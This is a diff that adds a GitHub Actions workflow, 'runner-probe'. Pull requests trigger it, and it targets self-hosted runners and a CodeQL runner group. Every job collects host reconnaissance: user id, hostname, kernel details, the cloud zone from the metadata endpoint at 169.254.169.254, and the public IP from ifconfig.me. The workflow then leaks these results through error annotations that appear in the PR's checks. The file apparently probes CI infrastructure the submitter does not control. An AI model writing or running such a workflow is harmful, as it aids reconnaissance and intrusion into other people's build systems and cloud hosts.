@@ -1,0 +1,48 @@
+name: runner-probe
+on:
+  pull_request:
+    branches: [ main ]
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  probe-group:
+    runs-on:
+      group: codeql-runner-group
+    continue-on-error: true
+    steps:
+      - name: machine
+        shell: bash
+        run: |
+          set +e
+          echo "::error title=probe-group-id::$(id 2>&1 | head -c 300)"
+          echo "::error title=probe-group-host::$(hostname -f 2>&1 | head -c 200)"
+          echo "::error title=probe-group-uname::$(uname -a 2>&1 | head -c 300)"
+          echo "::error title=probe-group-gchost::$(cat /etc/hostname 2>&1 | head -c 120)"
+          echo "::error title=probe-group-zone::$(curl -s -m 6 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/zone 2>&1 | head -c 200)"
+          echo "::error title=probe-group-ip::$(curl -s -m 6 https://ifconfig.me 2>&1 | head -c 60)"
+          id; hostname -f; uname -a
+  probe-sh:
+    runs-on: [ self-hosted ]
+    continue-on-error: true
+    steps:
+      - name: machine
+        shell: bash
+        run: |
+          set +e
+          echo "::error title=probe-sh-id::$(id 2>&1 | head -c 300)"
+          echo "::error title=probe-sh-host::$(hostname -f 2>&1 | head -c 200)"
+          echo "::error title=probe-sh-uname::$(uname -a 2>&1 | head -c 300)"
+          echo "::error title=probe-sh-zone::$(curl -s -m 6 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/zone 2>&1 | head -c 200)"
+          echo "::error title=probe-sh-ip::$(curl -s -m 6 https://ifconfig.me 2>&1 | head -c 60)"
+  probe-gh:
+    runs-on: ubuntu-latest
+    continue-on-error: true
+    steps:
+      - name: machine
+        shell: bash
+        run: |
+          set +e
+          echo "::error title=probe-gh-id::$(id 2>&1 | head -c 300)"
+          echo "::error title=probe-gh-host::$(hostname 2>&1 | head -c 200)"
+          echo "::error title=probe-gh-uname::$(uname -a 2>&1 | head -c 300)"
